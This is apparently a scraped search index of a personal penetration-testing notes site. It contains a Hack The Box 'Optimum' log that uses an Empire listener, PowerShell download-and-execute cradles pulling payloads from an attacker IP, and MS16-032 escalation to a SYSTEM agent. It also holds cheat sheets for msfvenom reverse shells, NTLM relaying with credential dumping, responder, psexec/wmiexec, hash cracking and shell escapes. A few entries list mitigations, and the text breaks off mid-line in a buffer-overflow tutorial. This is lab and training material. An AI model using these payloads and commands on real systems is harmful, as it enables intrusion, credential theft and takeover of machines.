/mnt/hgfs/_shared_folder/htb/boxes/Optimum/scans/wes.txt  (Empire: listeners/http) \u0026gt; info Name: HTTP[S] Category: client_server Authors: @harmj0y Description: Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach. HTTP[S] Options: Name Required Value Description ---- -------- ------- ----------- SlackToken False Your SlackBot API token to communicate with your Slack instance. ProxyCreds False default Proxy credentials ([domain\\]username:password) to use for request (default, none, or other). KillDate False Date for the listener to exit (MM/dd/yyyy). Name True http Name for the listener. Launcher True powershell -noP -sta -w 1 -enc Launcher string. DefaultDelay True 5 Agent delay/reach back interval (in seconds). DefaultLostLimit True 60 Number of missed checkins before exiting WorkingHours False Hours for the agent to operate (09:00-17:00). SlackChannel False #general The Slack channel or DM that notifications will be sent to. DefaultProfile True /admin/get.php,/news.php,/login/ Default communication profile for the agent. process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Host True http://10.10.14.24:80 Hostname/IP for staging. CertPath False Certificate path for https listeners. DefaultJitter True 0.0 Jitter in agent reachback interval (0.0-1.0). Proxy False default Proxy to use for request (default, none, or other). UserAgent False default User-agent string to use for the staging request (default, none, or other). StagingKey True :G8UuB/cqX2t^=?a[b{!Hd*#IZy_hrnL Staging key for initial agent negotiation. BindIP True 10.10.14.24 The IP to bind to on the control server. Port True 80 Port for the listener. ServerVersion True Microsoft-IIS/7.5 Server header for the control server. StagerURI False URI for the stager. Must use /download/. Example: /download/stager.php (Empire: listeners/http) \u0026gt; run *** Unknown syntax: run (Empire: listeners/http) \u0026gt; execute [*] Starting listener 'http' * Serving Flask app \u0026quot;http\u0026quot; (lazy loading) * Environment: production WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Debug mode: off [+] Listener successfully started! (Empire: listeners/http) \u0026gt; (Empire: listeners/http) \u0026gt; launcher powershell powershell -noP -sta -w 1 -enc SQBGA....FgA    Related files   e.ps1  (4 kb)   i.ps1  (13 kb)    cp /opt/Empire/data/module_source/privesc/Invoke-MS16032.ps1 i.ps1\n.... } }invoke-ms16032 -Command \u0026quot;IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.24:8888/e.ps1')\u0026quot;  meterpreter \u0026gt; shell Process 2536 created. Channel 2 created. Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Users\\kostas\\Desktop\u0026gt;powershell \u0026quot;IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.24:8888/i.ps1')\u0026quot; powershell \u0026quot;IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.24:8888/i.ps1')\u0026quot; __ __ ___ ___ ___ ___ ___ ___ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u0026gt; @FuzzySec] [!] Holy handle leak Batman, we have a SYSTEM shell!!  root@kali:/mnt/hgfs/_shared_folder/htb/boxes/Optimum/web# python3 -m http.server 8888 Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ... 10.10.10.8 - - [24/Jan/2020 20:49:09] \u0026quot;GET /i.ps1 HTTP/1.1\u0026quot; 200 - 10.10.10.8 - - [24/Jan/2020 20:49:22] \u0026quot;GET /e.ps1 HTTP/1.1\u0026quot; 200 -  (Empire: listeners) \u0026gt; [*] Sending POWERSHELL stager (stage 1) to 10.10.10.8 [*] New agent WYDHC35E checked in [+] Initial agent WYDHC35E from 10.10.10.8 now active (Slack) [*] Sending agent (stage 2) to WYDHC35E at 10.10.10.8 (Empire: listeners) \u0026gt; agents [*] Active agents: Name La Internal IP Machine Name Username Process PID Delay Last Seen ---- -- ----------- ------------ -------- ------- --- ----- --------- WYDHC35E ps 10.10.10.8 OPTIMUM *NT AUTHORITY\\SYSTEM powershell 1684 5/0.0 2020-01-24 20:50:03  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/post-exploitation/",
	"title": "Post Exploitation",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/04-post-exploitation/active-directory/powerview/",
	"title": "powerview",
	"tags": ["ActiveDirectory"],
	"description": "powerview description.",
	"content": "powerview "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/graficomspoorzoeker/solutions/",
	"title": "Solutions",
	"tags": ["Graficom Spoorzoeker"],
	"description": "Solutions of the Graficom Spoorzoeker",
	"content": "0/4 ROT13\nhttps://pastebin.com/raw/n38HfrUS\nHEX to ASCII\n50 65 72 64 6f 6b 27 73 20 73 70 6f 6f 72 7a 6f 65 6b 65 72 20 21 54 68 69 6e 67 73 20 61 72 65 20 6e 6f 74 20 61 73 20 74 68 65 79 20 73 65 65 6d 2c 20 73 6f 20 49 20 77 69 6c 6c 20 62 72 69 6e 67 20 79 6f 75 20 75 70 20 74 6f 20 73 70 65 65 64 2e 0a 4d 69 72 72 6f 72 20 74 68 65 20 42 61 73 65 20 61 6e 64 20 79 6f 75 20 77 69 6c 6c 20 73 75 63 63 65 65 64 2e 20  Perdok's spoorzoeker ! Things are not as they seem, so I will bring you up to speed. Mirror the Base and you will succeed.  1/4 Base64 Decode + Reverse string\nc2l0YXJH -\u0026gt; sitarG -\u0026gt; Gratis  2/4 flip Upsidedown + Base64 Decode + reverse string\nɔɯΛuɔuΛᴉqMℲI -\u0026gt; cmVncnVibWFI-\u0026gt; regrubmaH -\u0026gt; Hamburger  3/4 JSUnFuck -\u0026gt; Alert MSG -\u0026gt; base64 decode + reverse string\nalert(cm9vdg==) -\u0026gt; roov -\u0026gt; voor  4/4 https://darkbyte.ru/ -\u0026gt; https://xcode.darkbyte.ru/ -\u0026gt; upload png -\u0026gt; base64 decode + reverse string\ndW9q -\u0026gt; ouj -\u0026gt; jou  Solution. Gratis Hamburger voor jou\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/04-post-exploitation/wordpress/wpadmin-plugin-upload/",
	"title": "wpadmin plugin upload",
	"tags": ["Post Exploitation"],
	"description": "wpadmin plugin upload description.",
	"content": "wpadmin plugin upload Abuse the plugin function to upload a shell.\nmsf \u0026gt; use exploit/unix/webapp/wp_admin_shell_upload msf exploit(wp_admin_shell_upload) \u0026gt; show targets ...targets... msf exploit(wp_admin_shell_upload) \u0026gt; set TARGET \u0026lt; target-id \u0026gt; msf exploit(wp_admin_shell_upload) \u0026gt; show options ...show and set options... msf exploit(wp_admin_shell_upload) \u0026gt; exploit  or simply login, go the plugins, upload a file and go the the WP upload folder (wp-content/uploads)\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/active-directory/",
	"title": "Active Directory",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/attack-tools/",
	"title": "Attack Tools",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/04-post-exploitation/zip/encrypted-password-protected-zip/",
	"title": "encrypted password protected zip",
	"tags": ["Post Exploitation"],
	"description": "encrypted password protected zip description.",
	"content": "encrypted password protected zip zip2john extract zip hash\nzip2john crackme.zip \u0026gt; crackeziphash.txt ver 2.0 efh 5455 efh 7875 crackme.zip/DoNotTouch PKZIP Encr: 2b chk, TS_chk, cmplen=335181, decmplen=884736, crc=E8183254  hashcat format remove zipfilename\nzip2john crackme.zip | cut -d \u0026quot;:\u0026quot; -f 2 \u0026gt; ziphash.txt ver 2.0 efh 5455 efh 7875 crackme.zip/DoNotTouch PKZIP Encr: 2b chk, TS_chk, cmplen=335181, decmplen=884736, crc=E8183254  fcrackzip root@kali:~# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt zipfile.  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/exploitation/",
	"title": "Exploitation",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/04-post-exploitation/passwords/hash-identifier/",
	"title": "hash identifier",
	"tags": ["Post Exploitation"],
	"description": "hash identifier description.",
	"content": "hash identifier hash-identifier HASH\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/04-post-exploitation/passwords/hashcat/",
	"title": "hashcat",
	"tags": ["Post Exploitation"],
	"description": "hashcat description.",
	"content": "hashcat basic wordlist Attack NTLM hashes using wordlist, enable custom kernels (limits lenght of pass to 27, better speed), use workload 3 and save in cracked_hashes\nhashcat -a 0 -m 1000 -O -w 3 hashfile wordlist -o cracked_hashes  wordlist + rulelist hashcat -a 0 -m 1000 -O -w 3 hashfile wordlist -o cracked_hashes -r rule  one-rule-to-rule-them-all https://www.notsosecure.com/one-rule-to-rule-them-all/\nhttps://github.com/NotSoSecure/password_cracking_rules\nbruteforcing predefined charsets ?l = abcdefghijklmnopqrstuvwxyz ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ ?d = 0123456789 ?s = «space»!\u0026quot;#$%\u0026amp;'()*+,-./:;\u0026lt;=\u0026gt;?@[\\]^_`{|}~ ?a = ?l?u?d?s ?b = 0x00 - 0xff  ?l?d?u is the same as:\n?ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\nBrute force all passwords length 1-8 with possible characters A-Z a-z 0-9 hashcat64 -m 500 hashes.txt -a 3 ?1?1?1?1?1?1?1?1 --increment -1 ?l?d?u\nusername:hash format hashfile\nuser:b4b9b02e6f09a9bd760f388b67351e2b  command\nhashcat64.exe -a 0 -m 1000 -O hashfile wordlist -o cracked_hashes --username  show username:hash:password ones cracked use \u0026ndash;show \u0026ndash;username to show username:hash:password (it uses the potfile for this).\nhashcat -m 1000 hashfile --show --username user:b4b9b02e6f09a9bd760f388b67351e2b:hashcat  output username:hash:password output to file in format\nhashcat -m 1000 hashfile --show --username -o user_hash_pass user:b4b9b02e6f09a9bd760f388b67351e2b:hashcat  PRINCE Password Generation PRINCE (PRobability INfinite Chained Elements) is a hashcat utility for randomly generating probable passwords:\npp64.bin --pw-min=8 \u0026lt; dict.txt | head -20 shuf dict.txt | pp64.bin --pw-min=8 | head -20  Purple Rain Purple Rain attack uses a combination of Prince, a dictionary and random Mutation rules to dynamicaly create infinite combinations of passwords.\nshuf dict.txt | pp64.bin --pw-min=8 | hashcat -a 0 -m 1000 -w 3 -O hashes.txt -g 300000  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/active-directory/ipv6-dns-takeover/",
	"title": "IPv6 DNS Takeover",
	"tags": ["Active Directory"],
	"description": "IPv6 DNS Takeover.",
	"content": "IPv6 DNS Takeover Windows prefers IPv6 over IPv4. This enables us to perform a DNS takeover using mitm6 if IPv6 is not already in use in the network. When this attack is performed, it is also possible to make computer accounts and users authenticate to us over HTTP by spoofing the WPAD location and requesting authentication to use our rogue proxy.\nAttacking Combine with mitm6 + ntlmrelayx + (getSP.py + ) secretsdump.py\nDefense Mitigating mitm6 mitm6 abuses the fact that Windows queries for an IPv6 address even in IPv4-only environments. If you don\u0026rsquo;t use IPv6 internally, the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy. Disabling IPv6 entirely may have unwanted side effects. Setting the following predefined rules to Block instead of Allow prevents the attack from working:\n (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-In) (Inbound) Core Networking - Router Advertisement (ICMPv6-In) (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-Out)  Mitigating WPAD abuse If WPAD is not in use internally, disable it via Group Policy and by disabling the WinHttpAutoProxySvc service.\nMitigating relaying to LDAP Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding.\nProtected users Consider adding Administrative users to the Protected Users group or marking them as \u0026lsquo;Account is sensitive and cannot be delegated\u0026rsquo;, which will prevent any impersonation of that user via delegation.\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/shells/msfvenom/",
	"title": "msfvenom",
	"tags": ["Exploitation"],
	"description": "msfvenom description.",
	"content": "msfvenom source\n   MSFVenom Payload Generation One-Liner Description     msfvenom -l payloads List available payloads   msfvenom -p PAYLOAD \u0026ndash;list-options List payload options   msfvenom -p PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT LHOST=IP Payload Encoding   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf \u0026gt; shell.elf Linux Meterpreter reverse shell x86 multi stage   msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf \u0026gt; shell.elf Linux Meterpreter bind shell x86 multi stage   msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf \u0026gt; shell.elf Linux bind shell x64 single stage   msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf \u0026gt; shell.elf Linux reverse shell x64 single stage   msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe \u0026gt; shell.exe Windows Meterpreter reverse shell   msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent=\u0026quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\u0026rdquo; -f exe \u0026gt; shell.exe Windows Meterpreter http reverse shell   msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe \u0026gt; shell.exe Windows Meterpreter bind shell   msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe \u0026gt; shell.exe Windows CMD Multi Stage   msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe \u0026gt; shell.exe Windows CMD Single Stage   msfvenom -p windows/adduser USER=hacker PASS=password -f exe \u0026gt; useradd.exe Windows add user   msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho \u0026gt; shell.macho Mac Reverse Shell   msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho \u0026gt; shell.macho Mac Bind shell   msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw \u0026gt; shell.py Python Shell   msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw \u0026gt; shell.sh BASH Shell   msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw \u0026gt; shell.pl PERL Shell   msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp \u0026gt; shell.asp ASP Meterpreter shell   msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw \u0026gt; shell.jsp JSP Shell   msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war \u0026gt; shell.war WAR Shell   msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw \u0026gt; shell.php cat shell.php pbcopy \u0026amp;\u0026amp; echo \u0026lsquo;?php '   msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw \u0026gt; phpreverseshell.php Php Reverse Shell   msfvenom -a x86 \u0026ndash;platform Windows -p windows/exec CMD=\u0026quot;powershell \\\u0026ldquo;IEX(New-Object Net.webClient).downloadString(\u0026lsquo;http://IP/nishang.ps1\u0026rsquo;)\u0026quot;\u0026rdquo; -f python Windows Exec Nishang Powershell in python   msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b \u0026ldquo;\\x04\\xA0\u0026rdquo; Bad characters shikata_ga_nai   msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b \u0026ldquo;\\x04\\xA0\u0026rdquo; Bad characters fnstenv_mov    Multihandler Listener To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,\nmsf\u0026gt;use exploit/multi/handler msf\u0026gt;set payload windows/meterpreter/reverse_tcp msf\u0026gt;set lhost \u0026lt;IP\u0026gt; msf\u0026gt;set lport \u0026lt;PORT\u0026gt; msf\u0026gt; set ExitOnSession false msf\u0026gt;exploit -j  The -j option is to keep all the connected session in the background.\nReferences https://kb.help.rapid7.com/discuss/598ab88172371b000f5a4675\nhttps://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/\nhttp://security-geek.in/2016/09/07/msfvenom-cheat-sheet/\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/ntlmrelayx/",
	"title": "ntlmrelayx",
	"tags": ["Attack Tools"],
	"description": "ntlmrelayx description.",
	"content": "ntlmrelayx Relay to Workstations other Clients dump SAM ntlmrelayx.py -tf targets.txt -smb2support\ninteractive session ntlmrelayx.py -tf targets.txt -smb2support -i\nExecute a file ntlmrelayx.py -tf targets.txt -smb2support -e malware.exe\nExecute a command ntlmrelayx.py -tf targets.txt -smb2support -c \u0026quot;whoami\u0026quot;\nRelay to AD with LDAP Basic command This command will:\n dump LDAP information if credentials allow it  add a Domain Admin account (user is added to Enterprise Admins group) setup a \u0026lsquo;domain user\u0026rsquo; account with ACL rights to preform a DCsync.    ntlmrelayx.py -6 -t ldaps://10.11.12.1 -wh wdap.lab.justin-p.me\nCombine with secretsdump.py for fun.\nsecretsdump.py UDlGmXMPsh:'e=yZF\u0026amp;~+.RUJ|dh'@lab.justin-p.me -just-dc Impacket v0.9.21.dev1+20200209.151450.b938f422 - Copyright 2020 SecureAuth Corporation [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:a:a::: Guest:501:a:a::: krbtgt:502:a:a:::  Create a computer account in AD Any user can create up to 10 computer accounts. Using the command below we can use relayed credentials to create a computer account. By default it will create a random computer account in the default computer OU.\nntlmrelayx.py -6 -t ldaps://10.11.12.1 -wh wdap.lab.justin-p.me --add-computer [OPTIONAL COMPUTERNAME]\nAbuse msDS-AllowedToActOnBehalfOfOtherIdentity Works by default and does not require any AD credentials to perform!\nComputer accounts can modify some of their own properties via LDAP, which includes the msDS-AllowedToActOnBehalfOfOtherIdentity attribute. This attribute controls which users can authenticate to the computer as almost any account in AD via impersonation using Kerberos. This concept is called Resource-Based constrained delegation.\nWe can abuse this when we relay a computer account credential by modifying this attribute to give ourselves rights impersonate users on that computer.\nThe command below will add a new computer account to the domain, it will then add that computer account to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of the relayed computer account.\nntlmrelayx.py -6 -t ldaps://10.11.12.1 -wh wdap.lab.justin-p.me --delegate-access\nCombine with getST.py and secretsdump.py for complete control over workstation.\ngetST.py -spn cifs/LAB-PC01.lab.justin-p.me lab.justin-p.me/test-machine\\$ -impersonate administrator Impacket v0.9.21.dev1+20200209.151450.b938f422 - Copyright 2020 SecureAuth Corporation Password: [*] Getting TGT for user [*] Impersonating administrator [*] Requesting S4U2self [*] Requesting S4U2Proxy [*] Saving ticket in administrator.ccache  KRB5CCNAME=administrator.ccache secretsdump.py -k -no-pass LAB-PC01.lab.justin-p.me [*] Service RemoteRegistry is in stopped state [*] Service RemoteRegistry is disabled, enabling it [*] Starting service RemoteRegistry [*] Target system bootKey: 0xb5f4662f815fdf939e16188273d583a2 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500: [*] Cleaning up... [*] Stopping service RemoteRegistry [*] Restoring the disabled state for service RemoteRegistry  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/shells/payloads/",
	"title": "payloads",
	"tags": ["Exploitation"],
	"description": "payloads description.",
	"content": "payloads Non-staged  Sends exploit shellcode all at once Larger in size and won\u0026rsquo;t always work  windows/meterpreter_reverse_tcp ^  Staged  Sends payload in stages Can be less stable  windows/meterpreter/reverse_tcp ^  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/04-post-exploitation/priv-esc/",
	"title": "priv esc",
	"tags": ["Post Exploitation"],
	"description": "priv esc description.",
	"content": "priv esc    Checklists     g0tmi1k Linux Privilege Escalation   hacktricks Linux Privilege Escalation   fuzzysecurity Windows Privilege Escalation    PowerSploit - PowerUp   PayloadAllTheThings       Scripts      linPEAS    winPEAS    linenum    MSF - local_exploit_suggester    AonCyberLabs/Windows-Exploit-Suggester    jondonas/linux-exploit-suggester-2    RastaMouse/Sherlock powershell \u0026quot;IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.24:8888/Sherlock.ps1');$a=find-allvulns;$a | where-object {$_.VulnStatus -notlike 'not *'}| ft Title,VulnStatus,MSBulletin,CVEID,Link -autosize\u0026quot;    Path vulnerability If something searches the Path for a a command and where able to replace the path we can trick the system to execute something else.\nWhenever we use ls it will now actually run cat.\nexport PATH=\u0026quot;/tmp/tmp:${PATH}\u0026quot; cp /bin/cat /tmp/tmp/cat mv /tmp/tmp/cat /tmp/tmp/ls  GTFOBins Download files in command prompt certutil.exe -urlcache -split -f \u0026quot;https://url/file\u0026quot; file  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/psexec/",
	"title": "psexec",
	"tags": ["Attack Tools"],
	"description": "psexec description.",
	"content": "psexec MSFConsole exploit/windows/smb/psexec\nPSExec.py psexec.py lab.justin-p.me/dwalker:StrongPass1@10.11.12.101\nalternatives smbexec smbexec.py lab.justin-p.me/dwalker:StrongPass1@10.11.12.101\nwmiexec Example 1 wmiexec.py lab.justin-p.me/dwalker:StrongPass1@10.11.12.101\nExample 2 wmiexec.py lab.justin-p.me/dwalker@10.11.12.101 'powershell -exec bypass -Noninteractive -windowstyle hidden -e 'PAYLOAD' -hashes a:hash\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/01-reconnaissance/public-key-disclosure/",
	"title": "public key disclosure",
	"tags": ["Reconnaissance"],
	"description": "public key disclosure description.",
	"content": "public key disclosure Very often keys are pushed to code repositories such as Github, Bitbucket or Gitlab. You want to identify a target code repo and search all commit history to discover secerts that might have been pushed.\nFind secrets live: https://www.shhgit.com/\nTools to search git repos\n  gitleaks\n  gitrob\n  truffleHog\n  Example docker pull zricethezav/gitleaks docker run --rm --name=gitleaks zricethezav/gitleaks -v -r https://github.com/name/repo.git  When it returns a match it will also include a git commit which you can use to view it in a browser or use git to \u0026lsquo;check it out\u0026rsquo;.\ngit checkout commit  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/reconnaissance/",
	"title": "Reconnaissance",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/responder/",
	"title": "responder",
	"tags": ["Attack Tools"],
	"description": "responder description.",
	"content": "responder Basic usage run responder on eth0\nresponder -I eth0\nAnaylise mode responder -I eth1 -A\nSet and forget (silent for users) !!! likely break stuff on the network !!!\n Verbose Enable answers for netbios wredir suffix queries. Enable answers for netbios domain suffix queries. Start the WPAD rogue proxy server. Fingerprint a host that issued an NBT-NS or LLMNR query.  responder -I eth1 -rdwfv\nSet and forget (interactive) !!! likely break stuff on the network !!!\nall of silent and:\n Force NTLM/Basic authentication on wpad.dat file Return a Basic HTTP authentication. Default: NTLM  responder -I eth1 -wFfbrdwv\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/04-post-exploitation/shell-escaping/",
	"title": "shell escaping",
	"tags": ["Post Exploitation"],
	"description": "shell escaping description.",
	"content": "shell escaping editors vim :!/bin/sh  :set shell=/bin/sh :shell  ed !'/bin/sh'  ne Load Prefs  nano CTRL+R CTRL+X reset; bash 1\u0026gt;\u0026amp;0 2\u0026gt;\u0026amp;0  Pager More/Less Open a file that is larger then your terminal.\nRun !'sh'\nman Run !'sh'\nThis to works sinse man uses more/less.\npinfo press ! followed by the command you want to run.\nConsole Browsers pagers can also be used a editors in console browsers.\nlinks FILE \u0026gt; OS Shell\nlynx open webpage.\npress o\nconfigure vim as editor\nor\nlynx --editor=/usr/bin/vim www.google.com  elinks export EDITOR=/usr/bin/vim  open a site with a textbox. Press ENTER and then F4. elinks will use vim.\nmutt open mutt\npress !\nenter /bin/Shell\nfind when ever it finds udp,xml it will cd to root and run ls.\nfind . -name udp.xml -exec awk 'BEGIN {system(\u0026quot;cd /root; ls\u0026quot;)}' \\;\nnmap before version r17131\nnmap --interactive !sh  Programming Techniques awk awk 'BEGIN {system(\u0026quot;/bin/sh\u0026quot;)}'\nexpect Expect spwan sh sh  python python -c 'import os; os.system(\u0026quot;/bin/sh\u0026quot;);'\nruby irb exec 'bin/sh'  perl perl -e 'system(\u0026quot;sh -i\u0026quot;)'\nperl -e 'exec(\u0026quot;sh -i\u0026quot;)'\nphp php -a exec(\u0026quot;sh -i\u0026quot;);  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/active-directory/smb-relay/",
	"title": "SMB Relay",
	"tags": ["Active Directory"],
	"description": "SMB Relay.",
	"content": "SMB Relay Use a captures hash to authenticated against a PC.\n SMB signing has to be disabled. (nmap \u0026ndash;script smb2-security-mode.nse -p 445 CIDR/HOST) User credentials must have remote login access  Attacking Setup responder to not start a SMB and HTTP server. (vim /usr/share/responder/Responder.conf)\nresponder + ntlmrelayx\nDefences  Enable SMB signing  pro: fixes attack con: may cause slow down with file copies   Disable NTLM auth.  pro: fixes attack con: if kerberos goes down windows falls back to NTLM   Account tiering.  Pro: Limits domain admins to specific task, setup multiple tiered accounts. (only login into servers with need of DA). Con: may be difficult to implement/enforce.   Restrict local admin access.  Pro: Can prevent a lot of lateral movement Con: May increase load on SD/IT admins.    SMB signing GPO Computer Configuration \u0026gt; Policies \u0026gt; Windows Settings \u0026gt; Security Settings \u0026gt; Local Policies \u0026gt; Security Options\nServers Microsoft network server: Digitally sign communications (always) -\u0026gt; Enabled\nIf SMBv1 is needed: Microsoft network server: Digitally sign communications (if client agrees) -\u0026gt; Enabled\nClients Microsoft network client: Digitally sign communications (always) -\u0026gt; Enabled\nIf SMBv1 is needed: Microsoft network client: Digitally sign communications (if server agrees) -\u0026gt; Enabled\nRestrict/Deny NTLM in Active Directory Computer Configurations -\u0026gt; Policies -\u0026gt; Windows Settings -\u0026gt; Security Settings -\u0026gt; Local Policies -\u0026gt; Security Options -\u0026gt; Network Security: Restrict NTLM: NTLM authentication in this domain\nDeny all\nAccount tiering See this and this\nRestrict local admin access Try looking into LAPS.\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/04-post-exploitation/passwords/unshadow/",
	"title": "unshadow",
	"tags": ["Post Exploitation"],
	"description": "unshadow description.",
	"content": "unshadow unshadow passwd-file.txt shadow-file.txt\nunshadow passwd-file.txt shadow-file.txt \u0026gt; unshadowed.txt\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/03-exploitation/active-directory/wpad/",
	"title": "WPAD",
	"tags": ["Active Directory"],
	"description": "WPAD description.",
	"content": "WPAD Windows can use a upstream proxy. To make configuring this proxy easier WPAD can be used. Web Proxy Auto-Discovery Protocol (WPAD) is a method used by clients to locate the URL of a configuration file using DHCP and/or DNS.\nA attacker can serve a fake WPAD server and respond to client WPAD name resolutions. The client then requests the wpad.dat file from this fake WPAD Server. Responder creates an authentication screen and asks clients to enter the username and password they use in the domain.\nAttacking responder + ntlmrelayx\nmitm6 + ntlmrelayx + (getSP.py + ) secretsdump.py\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/exploit-development/buffer-overflow/",
	"title": "Buffer Overflow",
	"tags": ["Exploit Development"],
	"description": "Buffer Overflowaaaaaaaaaaaaaaaaaaaaaaaaaa.",
	"content": "Buffer Overflow Steps  Crash The Application  Spiking Fuzzing   Find EIP Offset Control ESP Identify Bad Characters Find JMP ESP Generate Shell Code Exploit  Definitions          EIP The Extended Instruction Pointer (EIP) is a register that contains the address of the next instruction for the program or command.   ESP The Extended Stack Pointer (ESP) is a register that lets you know where on the stack you are and allows you to push data in and out of the application.   JMP The Jump (JMP) is a register that performs an unconditional jump to transfer the flow of execution by changing the EIP register.   \\x41, \\x42 \\x43 The hexadecimal values for A, B and C.    Skeleton Python Script The easiest way to stay organized when writing these scripts is to use a skeleton file. The below is the going to be your working grounds for the rest of these exercises. I recommend that after each step has been completed, you create a copy of the script and name it at the step you completed. This way, if you get stuck, you can go back to a working step.\n#!/usr/bin/python import socket,sys address = '192.168.136.130' port = 9999 #offset = ? buff = b\u0026quot;\u0026quot; # empty byte var try: print(f'[+] Sending buffer: {str(len(buff))} bytes') s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((address,port)) s.recv(1024) s.send(b\u0026quot;%s\u0026quot; % buff) except RuntimeError as Err: print(f'[!] Unable to connect to the application. {err}') sys.exit(0) finally: s.close()  Crash The Application Spiking With SPIKE we can try to overflow each possible command.\nLets first look at what the program can do.\nroot@kali:~# nc 192.168.136.130 9999 Welcome to Vulnerable Server! Enter HELP for help. HELP Valid Commands: HELP STATS [stat_value] RTIME [rtime_value] LTIME [ltime_value] SRUN [srun_value] TRUN [trun_value] GMON [gmon_value] GDOG [gdog_value] KSTET [kstet_value] GTER [gter_value] HTER [hter_value] LTER [lter_value] KSTAN [lstan_value] EXIT EXT GOODBYE  Basic commands of SPIKE:\ns_string(argument); // Sends the argument without modification to he application s_string_variable(“random”); // Sends an array of random data to he application s_readline(); // Reads one line from the response  So lets start testing the Commands\nLets create .spk files for each command\nExample for STATS\ns_readline(); s_string(\u0026quot;STATS 